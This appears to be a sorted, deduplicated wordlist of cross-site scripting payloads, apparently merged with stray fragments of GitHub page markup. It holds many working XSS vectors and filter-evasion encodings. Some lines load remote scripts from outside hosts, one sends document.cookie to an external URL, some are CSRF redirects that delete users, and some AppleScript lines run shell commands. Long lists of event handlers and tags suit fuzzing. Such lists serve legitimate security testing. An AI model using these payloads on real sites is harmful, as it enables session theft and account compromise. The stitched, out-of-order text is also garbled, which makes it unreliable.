+Exploit Name: Obfuscated XML predicate vector variation 3
+Exploit Name: Obfuscated XSS variant 1
+Exploit Name: Obfuscated body onload vector
+Exploit Name: Obfuscated double-body onload vector
+Exploit Name: Obfuscated image tag using dec entities
+Exploit Name: Obfuscated image tag using hex entities
+Exploit Name: Obfuscated image tag using long dec entities
+Exploit Name: Obfuscated name trigger for Firefox
+Exploit Name: Obfuscated onload attribute variant 1
+Exploit Name: Obfuscated onload attribute variant 2
+Exploit Name: Octal Encoding
+Exploit Name: Open string contained in name property
+Exploit Name: PHP
+Exploit Name: Plain JavaScript alert
+Exploit Name: Protocol Resolution Bypass
+Exploit Name: Protocol resolution in script tags
+Exploit Name: Remote IE URL overloading
+Exploit Name: Remote Stylesheet 1
+Exploit Name: Remote Stylesheet 2
+Exploit Name: Remote Stylesheet 3
+Exploit Name: Remote Stylesheet 4
+Exploit Name: Removing Cnames
+Exploit Name: SCRIPT w/Char Code
+Exploit Name: SCRIPT w/Source File
+Exploit Name: SSI
+Exploit Name: STYLE
+Exploit Name: STYLE w/Anonymous HTML
+Exploit Name: STYLE w/Comment
+Exploit Name: STYLE w/background
+Exploit Name: STYLE w/background-image
+Exploit Name: STYLE w/broken up JavaScript
+Exploit Name: Self-contained XSS variant 1
+Exploit Name: Self-contained XSS variant 2
+Exploit Name: Self-contained XSS variant 3
+Exploit Name: Self-contained XSS variant 4
+Exploit Name: Self-contained XSS variant 5
+Exploit Name: Self-contained XSS variant 6
+Exploit Name: Self-contained XSS variant 7
+Exploit Name: Self-contained XSS variant 8
+Exploit Name: Self-contained XSS variant 9
+Exploit Name: Self-containing XSS with no dots
+Exploit Name: Spaces/Meta Chars
+Exploit Name: Style injection via content and double-eval
+Exploit Name: Style-breaker using obfuscated JavaScript
+Exploit Name: Stylesheet
+Exploit Name: Super basic HTML breaker 2
+Exploit Name: Super short XSS variant 1
+Exploit Name: Super short XSS variant 2
+Exploit Name: TABLE
+Exploit Name: TD
+Exploit Name: Textarea-breaker with mouseover
+Exploit Name: URL Encoding
+Exploit Name: URL breaker for double quotes
+Exploit Name: URL breaker for single quotes
+Exploit Name: URL encoded image source
+Exploit Name: URL-breaking vector
+Exploit Name: US-ASCII encoding
+Exploit Name: UTF-7 Encoding
+Exploit Name: UTF-8 Unicode Encoding
+Exploit Name: Unicode encoded script tags
+Exploit Name: XML HTML+TIME
+Exploit Name: XML data island w/CDATA
+Exploit Name: XML data island w/comment
+Exploit Name: XML namespace
+Exploit Name: XML predicate XSS using content[n]
+Exploit Name: XSS Quick Test
+Exploit Name: XSS via VBScript MsgBox
+Exploit Name: __parent__ stored JS alert
+Exploit Name: __proto__ stored JS alert
+Exploit Name: aim: uri exploit
+Exploit Name: navigatorurl: code execution
+Exploit Name: res:// installed software probing
+Exploit String: <?xml version="1.0"?>
+Exploit String: <A HREF="//google">XSS</A>
+Exploit String: <A HREF="//www.google.com/">XSS</A>
+Exploit String: <A HREF="http://66.102.7.147/">XSS</A>
+Exploit String: <A HREF="http://google.com/">XSS</A>
+Exploit String: <A HREF="http://google:ha.ckers.org">XSS</A>
+Exploit String: <A HREF="http://ha.ckers.org@google">XSS</A>
+Exploit String: <A HREF="http://www.google.com./">XSS</A>
+Exploit String: <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+Exploit String: <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+Exploit String: <IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+Exploit String: <IMG SRC="livescript:[code]">
+Exploit String: <IMG SRC="mocha:[code]">
+Exploit String: <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+Exploit String: <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+Exploit String: <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+Exploit String: <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+Exploit String: <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+Exploit String: <SCRIPT SRC=//ha.ckers.org/.j>
+Exploit String: <SCRIPT SRC=http://ha.ckers.org/xss.js
+Exploit String: <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+Exploit String: <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Exploit String: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+Exploit String: <div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&
+Exploit String: <script>
+Exploit String: <style>
+Exploit String: >"'
+Exploit String: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Exploit String: _
+Exploit String: a=/ev/
+Exploit String: a=/ev///
+Exploit String: a=<a>
+Exploit String: a=alert
+Exploit String: document.__parent__._=alert
+Exploit String: s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+Exploit String: s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=
+Exploit String: s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+Exploit String: setTimeout//
+Exploit String: top.__proto__._= alert
+Extra dot for Absolute DNS
+Extraneous Open Brackets
+FF <a href="//ⓜⓜⓜⓔ︒ⓜⓔ">click</a> url trick by @jackmasa
+FRAME
+FSCommand
+Filter Evasion 1
+Filter Evasion 2
+Firefox <iframe src=view-source://xxxx.com>; with drag and drop
+Firefox Lookups 1
+Firefox Lookups 2
+Firefox Lookups 3
+Firefox clipboard-hijack without script and css : http://<img alt="evil/#" width=0 height=0 >
+Firefox link host dom xss https://t.co/aTtzHaaG by @garethheyes
+Grave Accents
+HDGDHCGJHAHEAKCACACACACACACACACA
+HTML Entities
+HTML Quoute & Comment breaker
+HTML wrapped in XML
+HTTP Parameter Pollution
+Half-Open HTML/JavaScript
+Hex Encoding
+Hex Encoding w/out Semicolons
+IE VB Messagebox injection
+IE all version CSRF vector <img lowsrc=//google.com>
+IE backticked semicolon injection
+IE closing-tag expression injection
+IE expression injection
+IE vector location='&#118&#98&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41'
+IFRAME
+IMG Dynsrc
+IMG Embedded commands 1
+IMG Embedded commands 2
+IMG Lowsrc
+IMG No Quotes/Semicolon
+IMG STYLE w/expression
+IMG w/JavaScript Directive
+IMG w/VBscript
+INJECTX
+INJECTXXXXXXXXXXX
+INPUT Image
+IP Encoding
+Image onerror wrapped in XML statement
+Image tag with obfuscated JS URI
+Image w/CharCode
+JS Array Hijacking with MBCS encodings ppt  by @hasegawayosuke
+JS link with whitespace obfuscation
+JS string concatenation breaker
+JSON XSS Tips: /json.cgi?a.html by @hasegawayosuke
+JSON XSS Tips: /json/.html with PHP and .NET by or /json;.html with JSP by @superevr
+JSON based obfuscated onload vector
+JSON based onload vector
+JSON based semicolon-onload vector
+JSP 		a = val1
+JavaScript Includes
+JavaScript Link Location
+JavaScript concatenation vector variant 1
+JavaScript concatenation vector variant 2
+JavaScript concatenation vector variant 3
+JavaScript concatenation vector variant 4
+JavaScript concatenation vector variant 5
+JavaScript concatenation vector variant 6
+JavaScript concatenation vector variant 7
+JavaScript link location
+JavaScript-breaker using carriage return
+L
+LAYER
+List-style-image
+Livescript
+Local .htc file
+Long UTF-8 Unicode w/out Semicolons
+META
+META w/additional URL parameter
+META w/data:URL
+Malformed IMG Tags
+Manage cookies
+Markup breaker with special quotes
+Mixed Encoding
+Mocha
+Mozilla -moz-binding-url injection
+Mozilla -moz-binding-url injection - filter evading
+Multiline selfcontained XSS
+Multiline w/Carriage Returns
+Name contained XSS variant 1
+Name contained XSS variant 2
+Name contained XSS variant 3
+Name contained XSS variant 4
+No Closing Script Tag
+No Quotes/Semicolons
+No referer : <iframe src="javascript:'<script src=>;</script>'"></iframe>
+Non-Alpha/Non-Digit
+Non-Alpha/Non-Digit Part 2
+Noscript-breaker with mouseover
+Null Chars 1
+Null Chars 2
+OBJECT
+OBJECT w/Embedded XSS
+OBJECT w/Flash 2
+Obfuscated DOM element creation
+Obfuscated JS image source
+Obfuscated XML predicate vector variation 1
+Obfuscated XML predicate vector variation 2
+Obfuscated XML predicate vector variation 3
+Obfuscated XSS variant 1
+Obfuscated body onload vector
+Obfuscated double-body onload vector
+Obfuscated image tag using dec entities
+Obfuscated image tag using hex entities
+Obfuscated image tag using long dec entities
+Obfuscated name trigger for Firefox
+Obfuscated onload attribute variant 1
+Obfuscated onload attribute variant 2
+Octal Encoding
+On Mouse Over​
+Open string contained in name property
+Opera URL spoofing vuln data://mmme.me by @jackmasa POC:
+Opera cross-domain set cookie 0day: document.cookie='xss=jackmasa;domain=.me.'
+Opera data:message/rfc822 #XSS  by @insertScript
+PHNjcmlwdD4K
+PHP
+PHP 		a = val2
+Password
+Plain JavaScript alert
+Platform
+Prefix URI schemes.
+Protocol Resolution Bypass
+Protocol resolution in script tags
+Provide feedback
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser
+Remote IE URL overloading
+Remote Stylesheet 1
+Remote Stylesheet 2
+Remote Stylesheet 3
+Remote Stylesheet 4
+Removing Cnames
+Reverse 401 basic auth phishing by @jackmasa POC:
+S
+SCRIPT w/Char Code
+SCRIPT w/Source File
+SRC
+SSI
+STYLE
+STYLE w/Anonymous HTML
+STYLE w/Comment
+STYLE w/background
+STYLE w/background-image
+STYLE w/broken up JavaScript
+Safari URL spoofing about://mmme.me POC:
+Safari empty location bar bug by @jackmasa POC:
+Safari location object pollution tech:  by @kinugawamasato
+Same effect with
+Saved searches
+Search
+Self-contained XSS variant 1
+Self-contained XSS variant 2
+Self-contained XSS variant 3
+Self-contained XSS variant 4
+Self-contained XSS variant 5
+Self-contained XSS variant 6
+Self-contained XSS variant 7
+Self-contained XSS variant 8
+Self-contained XSS variant 9
+Self-containing XSS with no dots
+Set.constructor`alert\x28document.domain\x29```
+Sign in
+Sign up
+Spaces/Meta Chars
+Style injection via content and double-eval
+Style-breaker using obfuscated JavaScript
+Stylesheet
+Subscribe
+Super basic HTML breaker 2
+Super short XSS variant 1
+Super short XSS variant 2
+Support
+TABLE
+TD
+Textarea-breaker with mouseover
+The tabs and newlines only work if this is encapsulated with quotes.
+Timing vector <img src=//ixss.sinaapp.com/sleep.php>
+UEhOamNtbHdkRDRLCg==
+URL Encoding
+URL breaker for double quotes
+URL breaker for single quotes
+URL encoded image source
+URL-breaking vector
+US-ASCII encoding
+UTF-7 Encoding
+UTF-8 Unicode Encoding
+Unicode encoded script tags
+Use 127.1 no 127.0.0.1  by @jackmasa
+Username or email address
+Using IE XSS filter or Chrome xss auditor to block <meta> url redirect.
+V
+Webkit and Opera <a href="\/www.google.com/favicon.ico">click</a>
+X
+XML Entity XSS  by @garethheyes
+XML HTML+TIME
+XML data island w/CDATA
+XML data island w/comment
+XML namespace
+XML predicate XSS using content[n]
+XSS
+XSS Quick Test
+XSS via VBScript MsgBox
+XXX
+XXXXXXX
+You can’t perform that action at this time.
+[B]
+[C]
+[D]
+[\xC0][\xBC]script&gt;document.vulnerable=true;[\xC0][\xBC]/script&gt;
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+[data-color-mode="light"] .HeaderMenu-trailing-link a:focus-visible {
+\
+\"
+\");
+\"+
+\";
+\";document.vulnerable=true;;//
+\"><body onload=\"1\">
+\"><script>1<\\/script>
+\'
+\'><body onload=\'X\'>
+\'><script>X<\/script>
+\'\'\">
+\74svg o\156load\75alert\501\51\76
+\<script\>
+\\<script\\>
+\\\'><body onload=\\\'1\\\'>
+\\\'><script>1<\\/script>
+\u003C
+\u003Cscript\u003Escript
+\u003E
+\u003c
+\u003e
+\u{61}l\u{65}rt`1`
+\x25\x3Cscript\x25\x3E
+\x3C
+\x3Cscript\x3E
+\x3E
+\x3c
+\x3e
+]&gt;&lt;img /&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+]><img />//["'`-->]]>]</div>
+_
+__
+__parent__ stored JS alert
+__proto__ stored JS alert
+a
+a="get";
+a=&lt;a&gt;
+a=/ev/
+a=/ev///
+a=\"get\";
+a=`${alert/*}`;
+a=alert
+abbr
+about://xss.cx
+acronym
+add topic <iframe src=http://www.vulnerability-lab.com>
+address
+aim: uri exploit
+alert
+alert&#40;1&#41
+alert&#x28;1&#x29
+alert&lpar;1&rpar;
+alert\\`1\\`
+alert`1`
+anchor Chrome bypass
+animate
+animatemotion
+animatetransform
+applet
+area
+aria-haspopup="dialog"
+aria-hidden="true"
+aria-label="Homepage"
+aria-label="Search or jump to…"
+aria-label="Suggestions"
+article
+aside
+audio
+autocapitalize="off"
+autocomplete="off"
+b
+b=1
+base
+basefont
+bdi
+bdo
+behavior:_
+bgsound
+big
+blink
+blockquote
+blur:query-builder#clearButtonBlur
+blur:query-builder#inputBlur
+body
+body:after{
+br
+button
+c
+c="javascript:";
+c=1
+c=\"javascript&#058;\";
+canvas
+caption
+center
+charset=utf-
+cite
+class="ActionListWrap QueryBuilder-ListWrap"
+class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent text-left"
+class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
+class="QueryBuilder-StyledInput width-fit "
+class="QueryBuilder-StyledInputContent"
+class="application-main d-flex flex-auto flex-column"
+class="form-control"
+click:query-builder#clear
+code
+col
+colgroup
+combobox-commit:query-builder#comboboxCommit
+command
+content
+content: “\61\6c\65\72\74\28\31\29″
+crowdshield
+custom tags
+data
+data-a11y-animated-images="system" data-a11y-link-underlines="true"
+data-action="
+data-action="click:cookie-consent-link#showConsentManagement"
+data-action="click:qbsearch-input#handleExpand"
+data-action="click:qbsearch-input#searchInputContainerClicked"
+data-attempted-ssr="false"
+data-attempted-ssr="true"
+data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
+data-commit-hovercards-enabled
+data-cookie-consent-required="false"
+data-discussion-hovercards-enabled
+data-initial-cookie-consent-allowed=""
+data-issue-and-pr-hovercards-enabled
+data-locale="en"
+data-persist-list=false
+data-project-hovercards-enabled
+data-react-profiling="true"
+data-ssr="false"
+data-ssr="true"
+data-target="custom-scopes.customScopesNameField"
+data-target="custom-scopes.customScopesQueryField"
+data-target="qbsearch-input.inputButton"
+data-target="qbsearch-input.queryBuilderContainer"
+data-target="query-builder.resultsList"
+data-target="query-builder.styledInput"
+data-target="query-builder.styledInputContent"
+data:_
+datalist
+dd
+del
+details
+dfn
+dialog
+dir
+discard
+display dialog "XSS"
+div
+dl
+do script "cat /etc/hosts"
+do shell script "open -a Calculator"
+document.URL=...
+document.__parent__._=alert
+document.body. ...
+document.body.innerHtml=...
+document.cookie='xss=xss;domain=.cx.'
+document.domain='com' chrome/safari same domain suffix cross-domain trick.
+document.forms[0].action=...
+document.location.hostname=...
+document.location="http://xss.cx/default.aspx?c=" + document.cookie
+document.location=...
+document.location=window.name+'//'+
+dt
+e
+element
+em
+embed
+end tell
+eval
+expr\65 ss/*\&#x25;/ion\28URL=0\29
+expression\28URL=0\29
+fieldset
+figcaption
+figure
+focus:query-builder#clearButtonFocus
+focus:query-builder#inputFocus
+font
+font-family:_
+footer
+form
+fpevcg
+frame
+frameset
+h1
+hash
+head
+header
+hgroup
+hidden
+hr
+href="/"
+html
+i
+id    ID    #REQUIRED&gt;]&gt;
+id    ID    #REQUIRED>]>
+id="custom_scope_name"
+id="custom_scope_query"
+id="query-builder-test-results"
+iframe
+iframe Chrome bypass
+iframe.contentWindow.location.constructor.prototype
+image
+image2
+image3
+img
+img2
+innerHTML=document.title
+innerHTML=innerText
+innerText DOM XSS: innerHTML=innerText
+input
+input2
+input3
+input4
+input:query-builder#inputChange
+ins
+isindex
+j
+j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;
+jAvAsCrIpT&colon;prompt&lpar;1&rpar;
+javascript&#x3A;alert&lpar;1&rpar;
+javascript&#x3A;confirm&lpar;document&period;cookie&rpar;
+javascript:123">&#10;</a>
+javascript:123">&#13;</a>
+javascript:_
+javascript:confirm&lpar1&rpar
+kbd
+keydown:query-builder#inputKeydown
+keygen
+l
+label
+lang="en"
+legend
+li
+link
+listing
+location
+location.href=
+location="http://html5sec.org";
+location='&#118&#98&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41'
+location=location.hash
+main
+map
+mark
+marquee
+maxlength="50">
+maxlength="500">
+menu
+menuitem
+meta
+meter
+mousedown:query-builder#resultsMousedown
+multicol
+name="custom_scope_name"
+name="custom_scope_query"
+nav
+navigatorurl: code execution
+new new new new new alert`1`
+nextid
+nobr
+noembed
+noframes
+noscript
+object
+ol
+om.Char.Code</button></body></html>
+onAbort
+onActivate
+onAfterPrint
+onAfterUpdate
+onBeforeActivate
+onBeforeCopy
+onBeforeCut
+onBeforeDeactivate
+onBeforeEditFocus
+onBeforePaste
+onBeforePrint
+onBeforeUnload
+onBeforeUpdate
+onBegin
+onBlur
+onBounce
+onCellChange
+onChange
+onClick
+onContextMenu
+onControlSelect
+onCopy
+onCut
+onDataAvailable
+onDataSetChanged
+onDataSetComplete
+onDblClick
+onDeactivate
+onDrag
+onDragDrop
+onDragEnd
+onDragEnter
+onDragLeave
+onDragOver
+onDragStart
+onDrop
+onEnd
+onError
+onErrorUpdate
+onFilterChange
+onFinish
+onFocus
+onFocusIn
+onFocusOut
+onHashChange
+onHelp
+onInput
+onKeyDown
+onKeyPress
+onKeyUp
+onLayoutComplete
+onLoad
+onLoseCapture
+onMediaComplete
+onMediaError
+onMessage
+onMouseDown
+onMouseEnter
+onMouseLeave
+onMouseMove
+onMouseOut
+onMouseOver
+onMouseUp
+onMouseWheel
+onMove
+onMoveEnd
+onMoveStart
+onOffline
+onOnline
+onOutOfSync
+onPaste
+onPause
+onPopState
+onProgress
+onPropertyChange
+onReadyStateChange
+onRedo
+onRepeat
+onReset
+onResize
+onResizeEnd
+onResizeStart
+onResume
+onReverse
+onRowDelete
+onRowExit
+onRowInserted
+onRowsEnter
+onScroll
+onSeek
+onSelect
+onSelectStart
+onSelectionChange
+onStart
+onStop
+onStorage
+onSubmit
+onSyncRestored
+onTimeError
+onTrackChange
+onURLFlip
+onUndo
+onUnload
+onabort
+onactivate
+onafterprint
+onafterscriptexecute
+onafterupdate
+onanimationcancel
+onanimationend
+onanimationiteration
+onanimationstart
+onautocomplete
+onautocompleteerror
+onauxclick
+onbeforeactivate
+onbeforecopy
+onbeforecut
+onbeforedeactivate
+onbeforeeditfocus
+onbeforeinput
+onbeforepaste
+onbeforeprint
+onbeforescriptexecute
+onbeforetoggle
+onbeforeunload
+onbeforeupdate
+onbegin
+onblur
+onbounce
+oncancel
+oncanplay
+oncanplaythrough
+oncellchange
+onchange
+onclick
+onclose
+oncompassneedscalibration
+oncontextmenu
+oncontrolselect
+oncopy
+oncuechange
+oncut
+ondataavailable
+ondatasetchanged
+ondatasetcomplete
+ondblclick
+ondeactivate
+ondevicelight
+ondevicemotion
+ondeviceorientation
+ondeviceproximity
+ondrag
+ondragdrop
+ondragend
+ondragenter
+ondragexit
+ondragleave
+ondragover
+ondragstart
+ondrop
+ondurationchange
+onemptied
+onend
+onended
+onerror
+onerror=
+onerror=confirm;throw 1;
+onerror=eval;throw'=confirm\x281\x29';
+onerror=eval;throw'alert\x281\x29';
+onerrorupdate
+onexit
+onfilterchange
+onfinish
+onfocus
+onfocusin
+onfocusout
+onformchange
+onformdata
+onforminput
+onfullscreenchange
+ongesturechange
+ongestureend
+ongesturestart
+onhashchange
+onhelp
+oninput
+oninvalid
+onkeydown
+onkeypress
+onkeyup
+onlanguagechange
+onlayoutcomplete
+onload
+onload=
+onload='X' \" onload=\"X\"/onload=\"X\"/onload='X'/
+onloadeddata
+onloadedmetadata
+onloadend
+onloadstart
+onlosecapture
+onmediacomplete
+onmediaerror
+onmessage
+onmousedown
+onmouseenter
+onmouseleave
+onmousemove
+onmouseout
+onmouseover
+onmouseover=
+onmouseover="document.cookie=true;">//INJECTX
+onmouseup
+onmousewheel
+onmove
+onmoveend
+onmovestart
+onmozfullscreenchange
+onmozfullscreenerror
+onmozpointerlockchange
+onmozpointerlockerror
+onmsgesturechange
+onmsgesturedoubletap
+onmsgesturehold
+onmsgesturerestart
+onmsinertiastart
+onmspointercancel
+onmspointerdown
+onmspointerenter
+onmspointerhover
+onmspointerleave
+onmspointermove
+onmspointerout
+onmspointerover
+onmspointerup
+onoffline
+ononline
+onorientationchange
+onoutofsync
+onpagehide
+onpageshow
+onpaste
+onpause
+onplay
+onplaying
+onpointerdown
+onpointerenter
+onpointerleave
+onpointermove
+onpointerout
+onpointerover
+onpointerrawupdate
+onpointerup
+onpopstate
+onprogress
+onpropertychange
+onratechange
+onreadystatechange
+onreceived
+onrepeat
+onreset
+onresize
+onresizeend
+onresizestart
+onresume
+onreverse
+onrowdelete
+onrowenter
+onrowexit
+onrowinserted
+onrowsdelete
+onrowsinserted
+onscroll
+onscrollend
+onsearch
+onseek
+onseeked
+onseeking
+onselect
+onselectionchange
+onselectstart
+onshow
+onstalled
+onstart
+onstop
+onstorage
+onsubmit
+onsuspend
+onsynchrestored
+ontimeerror
+ontimeupdate
+ontoggle
+ontouchcancel
+ontouchend
+ontouchmove
+ontouchstart
+ontrackchange
+ontransitioncancel
+ontransitionend
+ontransitionrun
+ontransitionstart
+onunhandledrejection
+onunload
+onurlflip
+onuserproximity
+onvolumechange
+onwaiting
+onwebkitanimationend
+onwebkitanimationiteration
+onwebkitanimationstart
+onwebkitmouseforcechanged
+onwebkitmouseforcedown
+onwebkitmouseforceup
+onwebkitmouseforcewillbegin
+onwebkittransitionend
+onwebkitwillrevealbottom
+onwheel
+onzoom
+optgroup
+option
+output
+p
+param
+partial-name="appearance-settings"
+partial-name="keyboard-shortcuts-dialog"
+partial-name="marketing-navigation"
+picture
+placeholder="Search or jump to..."
+placeholder="github-ruby"
+plaintext
+pre
+progress
+prompt`${document.domain}`
+q
+r
+rb
+required
+res:// installed software probing
+role="listbox"
+rp
+rt
+rtc
+ruby
+s
+s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=
+s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+samp
+script
+scriptlet.html"></LAYER>
+section
+seekSegmentTime
+select
+set
+set system name <iframe src=http://www.vulnerability-lab.com>
+setInterval`alert\x28document.domain\x29`
+setTimeout//
+setTimeout`alert\x28document.domain\x29`
+shadow
+slot
+small
+source
+spacer
+span
+src="http://www.site.com/XSS.js"&gt;&lt;/script&gt;
+src="http://www.site.com/XSS.js"></script>
+strike
+strong
+style
+style="border-radius: 12px;"
+style="margin-left: 12px;"
+sub
+substr
+summary
+sup
+svg
+t
+tabindex="-1"
+table
+tbody
+td
+tell application "Terminal"
+template
+textarea
+tfoot
+th
+thead
+this["ownerDocu"+"ment"]["loca"+"tion"]=”//google.com”
+time
+title
+top.__proto__._= alert
+tr
+track
+tt
+type="button"
+type="text"
+typeof delete typeof  delete void void new new alert`1`
+u
+u1=s1+s2+s3;URL=u1
+ul
+v
+var
+video
+wbr
+width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;
+width:expression\28 prompt \28 1 \29 \29
+window.name='a\x01b'
+wtf? Chrome
+xmp
+xss=<link rel=import href=http://xss.cx/xss.js >
+{{paths}}
+{{path}}
+{{path}}/index.php?redirect=true&meth=ajax
+{}let{}={}
+}
+});
+¼script¾document.cookie=true;¼/script¾
+ß=ss <a href="http://ß.lv">click</a> by @_cweb
+æÆäÒàè.
+“oncut=’/*
+﻿>"'
